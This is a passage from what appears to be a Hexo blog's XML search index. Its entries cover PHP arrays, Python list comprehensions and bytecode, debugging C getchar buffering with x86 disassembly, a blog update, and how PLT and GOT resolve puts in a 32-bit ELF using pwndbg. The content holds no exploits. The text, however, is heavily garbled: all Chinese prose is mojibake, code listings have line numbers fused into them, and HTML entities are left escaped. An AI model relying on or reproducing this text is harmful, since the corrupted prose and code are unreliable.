é‚£å°±ä¼šæœ‰è¿™ç§ç»“æžœï¼š 1234567$array = array( "a", "b",6 =&gt; "c", "d",);var_dump($array); è¾“å‡ºä¸ºï¼š 12345678910array(4) &#123; [0] =&gt; string(1) &quot;a&quot; [1] =&gt; string(1) &quot;b&quot; [6] =&gt; string(1) &quot;c&quot; [7] =&gt; string(1) &quot;d&quot;&#125; ç¥žå¥‡çš„è§£å¼•ç”¨è¯­æ³• 12345678910111213&lt;?phpfunction getArray()&#123; return array(1,2,3,4);&#125;//è§£å¼•ç”¨è¯­æ³•$a = getArray()[0];var_dump($a);list(, $secondelement) = getArray();var_dump($secondelement); è¾“å‡ºä¸ºï¼š 12int(1)int(2) listå®šä¹‰ä¸ºï¼šå°†æ•°ç»„ä¸­çš„å€¼èµ‹å€¼ç»™å˜é‡ ç”¨[]çš„è¯­æ³• å¦‚æžœæœ‰ä¸€ä¸ªæ•°ç»„ $arr = array(5 =&gt; 1, 12 =&gt; 2); é‚£ä¹ˆ$arr[] = 56ç›¸å½“äºŽ$arr[13]=56 ä½¿ç”¨unsetå‡½æ•°å¯ä»¥å–æ¶ˆé”®å€¼å¯¹æ˜ å°„æ¯”å¦‚unset($arr[5]),æˆ–è€…é”€æ¯ä¸€ä¸ªæ•°ç»„unset($arr)]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonæ–‡æ¡£é˜…è¯»ç¬”è®°2]]></title>
    <url>%2F2019%2F07%2F30%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B02%2F</url>
    <content type="text"><![CDATA[fluent python reading notes åˆ—è¡¨æŽ¨å¯¼å¼ æœ€å¸¸è§çš„ä¸€ç§å†™æ³• 123symboles = 'ABC%^&amp;*#@$'beyond_ascii = [ord(s) for s in symboles if ord(s) &gt; 40]print(beyond_ascii) ä½†æ˜¯ä¹Ÿå¯ä»¥åŒæ—¶ç”¨filterå’Œmapå‡½æ•°æ¥å®žçŽ° 12beyond_ascii = list(filter(lambda x: x &gt; 40, map(ord, symboles)))print(beyond_ascii) mapå‡½æ•°å°†ä¸€ä¸ªå‡½æ•°ä½œç”¨äºŽlistä¸­çš„æ¯ä¸€ä¸ªå€¼ä¸Šï¼Œfilterä¹Ÿæ˜¯å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå€¼ä½œç”¨ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯åªè¿”å›žä¸ºçœŸçš„æ•°å€¼ï¼Œpython3ä¸­æœ€åŽè¿”å›žçš„æ˜¯ä¸€ä¸ªfilterå¯¹è±¡ æ¯”å¦‚è¿‡æ»¤åˆ—è¡¨ä¸­çš„æ‰€æœ‰å¥‡æ•° 1234# è¿‡æ»¤å‡ºåˆ—è¡¨ä¸­çš„æ‰€æœ‰å¥‡æ•°a = [1,242,45,23,536,1,325,63635,56335]a_is_odd = list(filter(lambda x: x % 2 != 0, a))print(a_is_odd) å†æ¯”å¦‚è¿‡æ»¤å‡º1~100ä¸­å¹³æ–¹æ ¹æ˜¯æ•´æ•°çš„æ•°å­— æ‰€è°“æ•´æ•°å°±æ˜¯èƒ½æ•´é™¤1çš„æ•°å­— 1234#è¿‡æ»¤å‡º1~100ä¸­å¹³æ–¹æ ¹æ˜¯æ•´æ•°çš„æ•°import mathg_is = list(filter(lambda x: math.sqrt(x) % 1 == 0, range(1, 101)))print(g_is) è§£åŒ… å¦‚ä¸‹æ˜¯ä¸€ä¸ªæ¯”è¾ƒç¥žå¥‡çš„æ —å­ï¼Œ 123456# pythonè§£åŒ…colors = ['black', 'white']sizes = ['S', 'M', 'L']for tshirt in ('%s %s' % (c, s) for c in colors for s in sizes): print(tshirt) è¿™é‡Œç”¨ä¸€ä¸ª%å°†å…ƒç»„è¿›è¡Œäº†æ‹†åŒ… å¦‚ä½•å¾ˆå¥½åœ°ç†è§£åˆ—è¡¨æŽ¨å¯¼å¼å‘¢ï¼Ÿ ä½ å¯ä»¥å°†å…¶æƒ³è±¡ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œfor c in colors for s in sizes è¿”å›žå€¼æ˜¯(c, s) ç”¨ä¸€ä¸ª%æˆåŠŸåœ°å¯¹å…¶è¿›è¡Œäº†æ‹†åŒ…è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å½¢å¼ ä¸‹é¢è¿™å¹…å›¾åº”è¯¥æ¯”è¾ƒå¥½ç†è§£ ç„¶åŽå°±æœ‰äº†è¿”å›žå€¼ å½“ç„¶è¿˜æœ‰è¿™ç§å†™æ³•ï¼š 1a, b, *rst = range(5) é™·é˜± 123t = (1,2, [30, 40])t[2] += [50, 60]print(t) åœ¨ä¸€ä¸ªä¸å¯å˜å¯¹è±¡ä¸­æ’å…¥äº†å¯å˜å¯¹è±¡ï¼ è™½ç„¶æŠ¥é”™ä½†æ˜¯tçš„å€¼ç¡®å®žè¢«ä¿®æ”¹äº† å¯¹å…¶è¿›è¡Œåæ±‡ç¼–æˆ–è€…æ˜¯åç¼–è¯‘ï¼š å¾—åˆ°ï¼š 1234567891011121314151617183 0 LOAD_CONST 1 (1) 3 LOAD_CONST 2 (2) 6 LOAD_CONST 3 (30) 9 LOAD_CONST 4 (40) 12 BUILD_LIST 2 15 BUILD_TUPLE 3 18 STORE_FAST 0 (t) 4 21 LOAD_FAST 0 (t) 24 LOAD_CONST 2 (2) 27 DUP_TOP_TWO 28 BINARY_SUBSCR 29 LOAD_CONST 5 (50) 32 LOAD_CONST 6 (60) 35 BUILD_LIST 2 38 INPLACE_ADD 39 ROT_THREE 40 STORE_SUBSCR ä½œè€…æå‡ºçš„ä¸‰ä¸ªæ•™è®­ï¼š ä¸è¦æŠŠå¯å˜å¯¹è±¡æ”¾åœ¨å…ƒç»„é‡Œé¢ å¢žé‡èµ‹å€¼ä¸æ˜¯ä¸€ä¸ªåŽŸå­æ“ä½œ æŸ¥çœ‹pythonçš„å­—èŠ‚ç å¹¶ä¸éš¾ï¼Œè€Œä¸”äº†è§£ä»£ç èƒŒåŽçš„è¿è¡Œæœºåˆ¶å¾ˆæœ‰å¸®åŠ© ç„¶åŽæˆ‘ä»¬å°±æ¥ç ”ç©¶pythonçš„å­—èŠ‚ç  pythonå­—èŠ‚ç  å˜é‡ LOAD_FASTä¸€èˆ¬åŠ è½½å±€éƒ¨å˜é‡çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯»å–å€¼ï¼Œç”¨äºŽè®¡ç®—æˆ–è€…å‡½æ•°è°ƒç”¨ä¼ å‚ç­‰ã€‚ STORE_FASTä¸€èˆ¬ç”¨äºŽä¿å­˜å€¼åˆ°å±€éƒ¨å˜é‡ã€‚ æ¯”å¦‚ï¼š 123461 77 LOAD_FAST 0 (n) 80 LOAD_FAST 3 (p) 83 INPLACE_DIVIDE 84 STORE_FAST 0 (n) INPLACE_DIVIDEå°±æ˜¯åŽŸåœ°é™¤æ³•ï¼Œå…ˆåŠ è½½nï¼Œç„¶åŽåŠ è½½pï¼Œç„¶åŽé™¤æ³•ï¼Œç„¶åŽä¿å­˜ç»“æžœ å¯¹åº”çš„å°±æ˜¯ n = n/p å¦‚ä½•åŒºåˆ†å‡½æ•°å½¢å‚å’Œå…¶ä»–çš„å±€éƒ¨å˜é‡ï¼Ÿ å½¢å‚æ²¡æœ‰åˆå§‹åŒ–ï¼Œä¹Ÿå°±æ˜¯ä»Žå‡½æ•°å¼€å§‹åˆ°LOAD_FASTè¯¥å˜é‡çš„ä½ç½®ï¼Œå¦‚æžœæ²¡æœ‰çœ‹åˆ°STORE_FASTï¼Œé‚£ä¹ˆè¯¥å˜é‡å°±æ˜¯å‡½æ•°å½¢å‚ã€‚ 123456789104 0 LOAD_CONST 1 (0) 3 STORE_FAST 1 (local1)5 6 LOAD_FAST 1 (local1) 9 PRINT_ITEM 10 LOAD_FAST 0 (arg1) 13 PRINT_ITEM 14 PRINT_NEWLINE 15 LOAD_CONST 0 (None) 18 RETURN_VALUE è¿™é‡Œarg1å°±æ²¡æœ‰STORE_FAST æ‰€ä»¥å¯¹åº”çš„æºä»£ç ä¸ºï¼š 123def test(arg1): local1 = 0 print local1, arg1 å…¨å±€å˜é‡ LOAD_GLOBALç”¨æ¥åŠ è½½å…¨å±€å˜é‡ï¼ŒåŒ…æ‹¬æŒ‡å®šå‡½æ•°åï¼Œç±»åï¼Œæ¨¡å—åç­‰å…¨å±€ç¬¦å·ã€‚ 12348 6 LOAD_CONST 2 (101) 9 STORE_GLOBAL 0 (global1) 20 LOAD_GLOBAL 0 (global1) 23 PRINT_ITEM å¯¹åº”çš„pythonä»£ç ï¼š 1234def test(): global global1 global1 = 101 print global1 å¸¸ç”¨æ•°æ®ç±»åž‹ BUILD_LISTç”¨äºŽåˆ›å»ºä¸€ä¸ªlistç»“æž„ã€‚ å¦‚æžœæ˜¯ç”¨åˆ—è¡¨æŽ¨å¯¼å¼å‘¢ï¼Ÿ BUILD_MAPç”¨äºŽåˆ›å»ºä¸€ä¸ªç©ºçš„dictã€‚STORE_MAPç”¨äºŽåˆå§‹åŒ–dictçš„å†…å®¹ã€‚ 1234563 0 LOAD_CONST 1 ('a') 3 LOAD_CONST 2 ('1') 6 BUILD_MAP 1 9 STORE_FAST 0 (k) 12 LOAD_CONST 0 (None) 15 RETURN_VALUE å‚è€ƒ æ­»ç£•pythonå­—èŠ‚ç -æ‰‹å·¥è¿˜åŽŸpythonæºç ]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pythonå­—èŠ‚ç </tag>
        <tag>tricks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cè¯­è¨€ç¼“å†²åŒº]]></title>
    <url>%2F2019%2F07%2F30%2FC%E8%AF%AD%E8%A8%80%E7%BC%93%E5%86%B2%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[è°ƒè¯•ä¸€ä¸‹cè¯­è¨€ç¨‹åº è‡ªæˆ‘æ„Ÿè§‰å¾ˆä¹…æ²¡å†™Cè¯­è¨€äº† getcharå‡½æ•° 1234567 char a = getchar();printf("a is %c\n", a);char b = getchar();printf("b is %c\n", b);char c = getchar();printf("c is %c\n", c);return 0; getcharå‡½æ•°æ˜¯ä¾æ¬¡ä»Žç¼“å†²åŒºä¸­å–å‡ºå­—ç¬¦æ¥ï¼Œä¼šå–èµ°çš„ï¼ï¼ 1234nihaoa is nb is ic is h è¿™ä¸€è¡Œ 12for (; scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == ' '; ++i) nums = (int*)realloc(nums, sizeof(int) * (i + 1)); //æ•°ç»„ä¸ºéžé™åºæŽ’åˆ— è¿™é‡Œä¼šè¦æ±‚ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œç”¨æˆ·è¾“å…¥çš„æ•°æ®å°±æ˜¯ä¼šå­˜æ”¾åœ¨ç¼“å†²åŒºå†…ï¼Œç„¶åŽä¹‹åŽscanfæ¯æ¬¡è¯»ä¸€ä¸ªæ•°å­—ï¼Œgetcharç´§éšå…¶åŽè¯»ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„æ—¶å€™å¿…é¡»æ˜¯ä¸€ä¸ªæ•°å­—ä¸€ä¸ªç©ºæ ¼ 1while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;); ä¹‹åŽæŠŠç¼“å†²åŒºçš„å­—ç¬¦è¯»å¹²å‡€ æµ‹è¯•ä¸€ä¸‹ï¼Œå¦‚æžœæˆ‘è¾“å…¥12 21\n é‚£ä¹ˆscanfè¯»å®Œ21ä¹‹åŽï¼Œgetcharå‡½æ•°è¯»\n 123456700D52466 je main+0DEh (0D524AEh) 00D52468 mov esi,esp 00D5246A call dword ptr [__imp__getchar (0D5F220h)] ;å‡½æ•°è¿”å›žå€¼å­˜æ”¾åœ¨eaxä¸­ï¼Œåè¿›åˆ¶10ï¼Œä»£è¡¨LF00D52470 cmp esi,esp 00D52472 call __RTC_CheckEsp (0D51357h) 00D52477 cmp eax,20h 00D5247A jne main+0DEh (0D524AEh) å…³é”®æ˜¯è¿™ä¸¤æ¡æŒ‡ä»¤ï¼š 1200D52472 call __RTC_CheckEsp (0D51357h) 00D52477 cmp eax,20h æ‰€ä»¥ä¹‹åŽæ¯”è¾ƒcmp eax 20hå°±ä¼šè·³å‡ºå¾ªçŽ¯ ä¹‹åŽè¿›å…¥é‚£ä¸ªwhileå¾ªçŽ¯ 1234567while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;);00D524AE mov esi,esp 00D524B0 call dword ptr [__imp__getchar (0D5F220h)] 00D524B6 cmp esi,esp 00D524B8 call __RTC_CheckEsp (0D51357h) 00D524BD cmp eax,0Ah 00D524C0 je main+119h (0D524E9h) æ­¤æ—¶ç¼“å†²åŒºå·²ç»æ˜¯ç©ºçš„äº†ï¼Œæ‰€ä»¥ä¼šè¦æ±‚ç”¨æˆ·ç»§ç»­è¾“å…¥æ•°æ® æˆ‘æ­¤æ—¶è¾“å…¥äº† 1\n æ‰€ä»¥è°ƒç”¨å®Œgetcharå‡½æ•°ä¹‹åŽeaxå­˜æ”¾äº†åå…­è¿›åˆ¶çš„49 é‚£ä¹ˆç¬¬äºŒä¸ªè°ƒç”¨getcharè¯»å–çš„ç»“æžœå°±æ˜¯0Ah 1234500D524C2 mov esi,esp 00D524C4 call dword ptr [__imp__getchar (0D5F220h)] 00D524CA cmp esi,esp 00D524CC call __RTC_CheckEsp (0D51357h) 00D524D1 cmp eax,0FFFFFFFFh ç»§ç»­ã€‚æ­¤æ—¶ç¼“å†²åŒºå·²ç»ç©ºäº† é‚£ä¹ˆä¼šè¦æ±‚ç”¨æˆ·ç»§ç»­è¾“å…¥ æˆ‘åˆè¾“å…¥äº†ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œå¾ˆæ˜Žæ˜¾æ­¤æ—¶è¯»å–çš„ç»“æžœéžç©ºï¼Œæ‰€ä»¥è·³å‡ºwhileå¾ªçŽ¯ 12345600D524D8 call dword ptr [__imp__getchar (0D5F220h)] 00D524DE cmp esi,esp 00D524E0 call __RTC_CheckEsp (0D51357h) 00D524E5 test eax,eax ;æ£€æŸ¥eaxæ˜¯å¦ä¸ºç©º00D524E7 jne main+11Bh (0D524EBh) 00D524E9 jmp main+0DEh (0D524AEh) é‡åˆ°çš„å°´å°¬ å¦‚æžœè¦ç¨‹åºçš„å¥å£®æ€§ï¼Œé‚£ä¹ˆç”¨æˆ·å¤šè¾“å…¥ä¸€ä¸ªç©ºæ ¼å°±ä¼šå‡ºé”™ï¼Œå› ä¸ºå¤šè¾“å…¥ä¸€ä¸ªç©ºæ ¼ç¨‹åºå°±ä¸çŸ¥é“åŽé¢é‚£ä¸ªæ˜¯ä»€ä¹ˆäº†ï¼ŒåŒæ—¶è¿˜æ¶‰åŠåˆ°getcharå‡½æ•°æ¸…ç©ºç¼“å†²åŒºï¼Œé‚£ä¸ªwhileå¾ªçŽ¯çš„å†™æ³•ç¡®å®žå¾ˆç»å…¸ï¼Œä½†æ˜¯å°±æ²¡æœ‰è€ƒè™‘è¿‡å¦‚æžœç¼“å†²åŒºæœ¬èº«å°±æ˜¯ç©ºçš„å‘¢ï¼Ÿ æˆ‘ä¿®æ”¹äº†ä¸€ä¸‹åŽŸæœ‰çš„ä»£ç ï¼ŒåŠ å…¥äº†cin.peekå‡½æ•°æ¥å¸®åŠ©åˆ¤æ–­ 12345678910111213141516171819202122232425262728while (1)&#123; nums = (int*)realloc(nums, sizeof(int) * (i + 1)); scanf("%d", &amp;nums[i]); i++; char ch = getchar(); if (ch == ' ') &#123; if (isdigit(cin.peek())) &#123; continue; &#125; else &#123; break; &#125; &#125; if (ch == '\n') &#123; break; &#125;&#125;// for(;scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == '\n'; i++)// &#123;// nums = (int *)realloc(nums, sizeof(int)*(i+1));// &#125;fflush(stdin);]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>ç¼“å†²åŒº</tag>
        <tag>getchar</tag>
        <tag>x86</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[blog æ›´æ–°å°è®°]]></title>
    <url>%2F2019%2F07%2F30%2Fblog-%E6%9B%B4%E6%96%B0%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[æ›´æ–° ç®€å•åœ°æ›´æ–°äº†ä¸€ä¸‹è‡ªå·±çš„blogï¼Œè™½ç„¶æ˜¯è¿™ä¹ˆè¯´ï¼Œä½†æ˜¯å®žé™…ä¸Šè¿˜æ˜¯èŠ±äº†ä¸å°‘æ—¶é—´æ¥å®Œå–„ï¼Œä¸»è¦æœ‰ï¼š ä¿®æ”¹äº†ä»£ç çš„é«˜äº®æ ¼å¼ï¼Œé»‘è‰²çš„ä¸»é¢˜æ›´å¥½çœ‹ä¸€äº› æ›´æ¢äº†blogçš„markdownå¼•æ“Žï¼Œå¯ä»¥æ¸²æŸ“emojäº† ä¿®æ”¹äº†è‡ªæˆ‘ä»‹ç»ï¼ŒåŽ»æŽ‰äº†ç½‘æ˜“äº‘éŸ³ä¹çš„å¤–é“¾ï¼Œå› ä¸ºå¤±æ•ˆäº†ï¼ŒåŒæ—¶æ·»åŠ äº†ç®€ä¹¦å’ŒçŸ¥ä¹Žé“¾æŽ¥ æ·»åŠ äº†å‹é“¾ æ·»åŠ äº†è¯„è®ºgitment TODO æœç´¢åŠŸèƒ½æ²¡æœ‰æ²¡æ³•ç”¨ blogè¿˜å¯ä»¥æ›´ç¾ŽåŒ–ä¸€ç‚¹ ä¸€ç‚¹æ„Ÿæƒ³ å–œæ¬¢è‡ªå·±æ­å»ºçš„è¿™ä¸ªå°å¤©åœ°ï¼Œè™½ç„¶æœ‰è¿™ä¹ˆæˆ–è€…é‚£ä¹ˆçš„ä¸å®Œå–„ï¼Œä½†æ˜¯è¿™ä¸ªblogè§è¯ç€æˆ‘çš„æˆé•¿ï¼]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[èŠèŠpltä¸Žgot]]></title>
    <url>%2F2019%2F07%2F24%2F%E8%81%8A%E8%81%8Aplt%E4%B8%8Egot%2F</url>
    <content type="text"><![CDATA[æ·±å…¥ç†è§£pltå’Œgot å…ˆå†™ä¸€æ®µä»£ç ï¼š 123456789// Build with: gcc -m32 --no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); exit(0);&#125; é€”ä¸­é‡åˆ°äº†ä¸€ä¸ªæŠ¥é”™ï¼š 1234In file included from /usr/include/stdio.h:27:0, from plt.c:3:/usr/include/features.h:374:25: fatal error: sys/cdefs.h: No such file or directory # include &lt;sys/cdefs.h&gt; ç„¶åŽå®‰è£…ä¸€ä¸ª: apt install libc6-dev-i386 ç¼–è¯‘å¥½ç¨‹åºä¹‹åŽ 1234567$ checksec plt [*] &apos;/home/pxy/pwnable/plt&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ç¨‹åºæ˜¯æ²¡æœ‰pieçš„ readelf -S pltæŸ¥çœ‹èŠ‚è¡¨ 12345[Nr] Name Type Addr Off Size ES Flg Lk Inf Al[12] .plt PROGBITS 08048300 000300 000050 04 AX 0 0 16[13] .text PROGBITS 08048350 000350 000192 00 AX 0 0 16[22] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4[23] .got.plt PROGBITS 0804a000 001000 00001c 04 WA 0 0 4 å¯ä»¥çœ‹åˆ°ï¼š .plt åŸºåœ°å€ä¸ºï¼š 0x08048300 .got åŸºåœ°å€ä¸ºï¼š 0x08049ffc .got.plt åŸºåœ°å€ä¸ºï¼š 0x0x804a000 æˆ‘ä»¬ä»Žè°ƒç”¨putså‡½æ•°é‚£é‡Œå¼€å§‹å•æ­¥æ‰§è¡Œ é¦–å…ˆè·³è½¬åˆ°pltè¡¨ä¸­ 120x804845d &lt;main+16&gt; call puts@plt &lt;0x8048310&gt;0x8048310 &lt;puts@plt&gt; jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; call putsä¹‹åŽï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤ä¹Ÿæ˜¯ä¸€ä¸ªè·³è½¬ jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; è¿™æ¡æŒ‡ä»¤çš„æ„æ€æ˜¯å–å‡ºputs@got.pltè¡¨ä¸­çš„å€¼ï¼Œæ”¾åˆ°pcå¯„å­˜å™¨ä¸­ æ‰€ä»¥ï¼ŸæŸ¥çœ‹ä¸€ä¸‹æ­¤å¤„å†…å­˜çš„å€¼ï¼š 12pwndbg&gt; x/2x 0x804a00c0x804a00c &lt;puts@got.plt&gt;: 0x08048316 0x08048326 æ‰€ä»¥ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å°±æ˜¯0x08048316è¿˜æ˜¯åœ¨pltè¡¨ä¸­ 12â–º 0x8048316 &lt;puts@plt+6&gt; push 0 0x804831b &lt;puts@plt+11&gt; jmp 0x8048300 è¿™é‡Œå…ˆå°†0æ”¾åˆ°æ ˆä¸Šï¼Œè¡¨æ˜Žæ˜¯è¦è§£æžputså‡½æ•°çš„åœ°å€ï¼Œç„¶åŽå†è·³è½¬åˆ°0x8048300ä¹Ÿå°±æ˜¯pltè¡¨çš„å¼€å§‹éƒ¨åˆ† 12â–º 0x8048300 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048306 jmp dword ptr [0x804a008] &lt;0xf7ff0650&gt; è¿™æ—¶å€™å…ˆæŠŠ.got.pltè¡¨ä¸­çš„ç¬¬äºŒé¡¹æ”¾åˆ°æ ˆä¸Š å…ˆæŸ¥çœ‹ä¸€ä¸‹.got.pltä¸­å‰ä¸‰é¡¹çš„å†…å®¹: 12pwndbg&gt; x/3x 0x804a0000x804a000: 0x08049f14 0xf7ffd938 0xf7ff0650 å°†0xf7ffd938æ”¾ç½®åˆ°æ ˆä¸Šï¼Œç„¶åŽè·³è½¬åˆ°.got.pltä¸­çš„ç¬¬ä¸‰é¡¹ï¼Œä¹Ÿå°±æ˜¯ 0xf7ff0650ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯_dl_runtime_resolveå‡½æ•°çš„åœ°å€ è´Ÿè´£è§£æžå‡½æ•°çš„åœ°å€ æ­¤æ—¶æˆ‘ä»¬çš„gotè¡¨å†…å®¹å¦‚ä¸‹ï¼š 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0x8048316 (puts@plt+6) â—‚â€” push 0 /* &apos;h&apos; */[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) â—‚â€” push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) â—‚â€” push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) â—‚â€” push ebp putså‡½æ•°çš„åœ°å€è¿˜æ²¡æœ‰é‡å®šä½ å½“æˆ‘ä»¬æ‰§è¡Œè¿‡ä¸€éputså‡½æ•°ä¹‹åŽ è¿™æ—¶å€™å›žè¿‡å¤´æ¥ç»§ç»­æŸ¥çœ‹gotè¡¨ä¸­çš„å†…å®¹ï¼š 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0xf7e727e0 (puts) â—‚â€” push ebp[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) â—‚â€” push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) â—‚â€” push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) â—‚â€” push ebp å¯ä»¥çœ‹åˆ°åœ°å€å·²ç»é‡å®šä½å¥½äº† è¿™å’ŒWindowsçš„PEæ–‡ä»¶æ ¼å¼ä¼¼ä¹Žæœ‰ç‚¹ä¸åŒäº†ï¼ŒPEæ–‡ä»¶æ˜¯è£…è½½è¿›å†…å­˜ä¹‹åŽå‡½æ•°åœ°å€éƒ½å·²ç»é‡å®šä½å¥½äº†ï¼Œè€ŒLinuxçš„elfæ–‡ä»¶åˆšåˆšè£…è¿›å†…å­˜ä¹‹åŽå‡½æ•°çš„åœ°å€è¿˜æ˜¯ä¸ç¡®å®šçš„ï¼Œéœ€è¦åœ¨è¿è¡Œçš„æ—¶å€™è¿›è¡Œé‡å®šä½ã€‚ å½“æˆ‘ä»¬å°†ä»£ç ä¿®æ”¹ä¸ºå¦‚ä¸‹æ—¶ï¼š 1234567891011pwndbg&gt; l 1, 20// Build with: gcc -m32 -no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); puts("hello world again !!!"); exit(0);&#125; ç¬¬ä¸€æ¬¡è°ƒç”¨putså‡½æ•°ä¹‹åŽï¼š [0x804a00c] puts -&gt; 0xf7e727e0 (puts) â—‚â€” push ebp putså‡½æ•°åœ°å€å·²ç»é‡å®šä½å¥½äº† æŽ¥ä¸‹æ¥å†æ¬¡è°ƒç”¨putså‡½æ•° 123456â–º 0x8048310 &lt;puts@plt&gt; jmp dword ptr [0x804a00c] &lt;0xf7e727e0&gt; â†“ 0xf7e727e0 &lt;puts&gt; push ebp 0xf7e727e1 &lt;puts+1&gt; push edi 0xf7e727e2 &lt;puts+2&gt; push esi 0xf7e727e3 &lt;puts+3&gt; push ebx æ­¤æ—¶å¯ä»¥çœ‹åˆ°ç›´æŽ¥å°±è·³åˆ°å‡½æ•°çš„åœ°å€äº† å› ä¸ºæ­¤æ—¶çš„.got.pltå·²ç»æ˜¯putså‡½æ•°çš„åœ°å€äº†ï¼Œ Linux tql æ•´ç†ä¸€ä¸‹ ä¹‹å‰çœ‹å‚è€ƒèµ„æ–™ä¸­åšä¸»çš„æ–‡ç« ä¸€ç›´æ²¡æœ‰å¾ˆç†è§£ï¼Œè¿™é‡Œç›´æŽ¥ç»Ÿä¸€è¯´ä¸€ä¸‹æˆ‘çš„ç†è§£ï¼š ä½•è°“PLTä¸ŽGOT å…¶å®žè¿™é‡Œå‡†ç¡®çš„æ¥è¯´åº”è¯¥å«got.pltè€Œä¸æ˜¯å«gotï¼Œä¸è¿‡ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬è¿˜æ˜¯å«å®ƒgotè¡¨å§ è¦æ³¨æ„é‚£ä¸ªjmp *printf@got *å·æ˜¯å–å‡ºåœ°å€å¤„çš„å€¼ï¼Œå¹¶ä¸æ˜¯è·³åˆ°gotè¡¨ä¸­åŽ» å»¶è¿Ÿé‡å®šä½ è¿™ç¯‡æ–‡ç« æˆ‘è§‰å¾—å†™çš„å¾ˆç²¾å½© Linuxä¸ºäº†ç¼©å‡ä»£ç ,å°±æ˜¯æŒ‰ç…§è¿™ç§æ¨¡å¼æ¥çš„ï¼š 12345678910void printf@plt()&#123;address_good: jmp *printf@got // é“¾æŽ¥å™¨å°†printf@gotå¡«æˆä¸‹ä¸€è¯­å¥lookup_printfçš„åœ°å€lookup_printf: è°ƒç”¨é‡å®šä½å‡½æ•°æŸ¥æ‰¾printfåœ°å€ï¼Œå¹¶å†™åˆ°printf@got goto address_good;&#125; ä¹Ÿå°±å’Œä¸Šé¢é‚£å¼ å›¾æ˜¯ä¸€ä¸€å¯¹åº”çš„ å…¬å…±gotè¡¨é¡¹ åœ¨è§£æžå‡½æ•°çš„çœŸæ­£åœ°å€æ—¶ï¼Œ _dl_runtime_resolveæ˜¯æ€Žä¹ˆçŸ¥é“å®ƒè¦è§£æžå“ªä¸ªå‡½æ•°çš„ å› ä¸ºï¼š 1234printf@plt&gt;: jmp *0x80496f8 push $0x00 jmp common@plt è¿™é‡Œpushçš„å€¼ä¸ä¸€æ ·ï¼Œç›¸å½“äºŽå°±æ˜¯æ¯ä¸ªå‡½æ•°å–äº†ä¸€ä¸ªid ä¹‹åŽå°±æ˜¯å…¬å…±gotè¡¨çš„å†…å®¹ï¼š got[0]: æœ¬ELFåŠ¨æ€æ®µ(.dynamicæ®µï¼‰çš„è£…è½½åœ°å€ got[1]ï¼šæœ¬ELFçš„link_mapæ•°æ®ç»“æž„æè¿°ç¬¦åœ°å€ got[2]ï¼š_dl_runtime_resolveå‡½æ•°çš„åœ°å€ ç©¿é’ˆå¼•çº¿ PLTè¡¨ä¸­çš„ç¬¬ä¸€é¡¹ä¸ºå…¬å…±è¡¨é¡¹ï¼Œå‰©ä¸‹çš„æ˜¯æ¯ä¸ªåŠ¨æ€åº“å‡½æ•°ä¸ºä¸€é¡¹ï¼ˆå½“ç„¶æ¯é¡¹æ˜¯ç”±å¤šæ¡æŒ‡ä»¤ç»„æˆçš„ï¼Œjmp *0xXXXXXXXXè¿™æ¡æŒ‡ä»¤æ˜¯æ‰€æœ‰pltçš„å¼€å§‹æŒ‡ä»¤ï¼‰æ¯é¡¹PLTéƒ½ä»Žå¯¹åº”çš„GOTè¡¨é¡¹ä¸­è¯»å–ç›®æ ‡å‡½æ•°åœ°å€ GOTè¡¨ä¸­å‰3ä¸ªä¸ºç‰¹æ®Šé¡¹ï¼Œåˆ†åˆ«ç”¨äºŽä¿å­˜ 